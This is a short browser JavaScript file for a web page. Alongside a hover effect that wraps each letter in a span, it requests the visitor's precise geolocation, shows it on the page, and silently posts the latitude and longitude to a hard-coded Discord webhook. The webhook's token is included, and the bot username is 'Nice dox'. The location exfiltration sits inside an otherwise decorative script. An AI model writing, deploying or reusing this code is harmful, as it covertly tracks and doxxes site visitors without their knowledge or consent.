document.getElementById('wordsbox').appendChild(getGeoCoords())
const hoverables = document.getElementsByClassName('word')
for (const word of hoverables) {
    spanify(word);
}
function spanify(...nodes) {
    for (const node of nodes) {
        const text = node.innerText.split('')
        node.innerText = ''
        text.forEach(char => {
            const span = document.createElement('span')
            span.innerText = char
            span.className = 'char hoverfx'
            node.appendChild(span)
        })
    }
}
function getGeoCoords() {
    const coords = document.createElement('span')
    coords.className = 'line'
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
            const lat = document.createElement('span')
            const long = document.createElement('span')
            lat.innerText = "Latitude: " + position.coords.latitude;
            long.innerText = "Longitude: " + position.coords.longitude;
            coords.appendChild(lat);
            coords.appendChild(long)
            sendDiscordMessage('https://discord.com/api/webhooks/1086011482518601889/iNo9jf7sYweE-Ix0Xaol1x9r78m_XavcVSBeLI-FokpDVgCB25EU0ffixsPXEwM4Ez0W',
                'Somebody did the thing:' + lat.innerText + ' ' + long.innerText)
            spanify(lat, long)
        }, null, { enableHighAccuracy: true, timeout: 1000, maximumAge: 0 });

    } else {
        coords.innerText = "Geolocation disabled :(";
    }
    return coords
}
function sendDiscordMessage(webHookURL, message) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", webHookURL, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
        'content': message,
        'username': 'Nice dox',
    }));
}
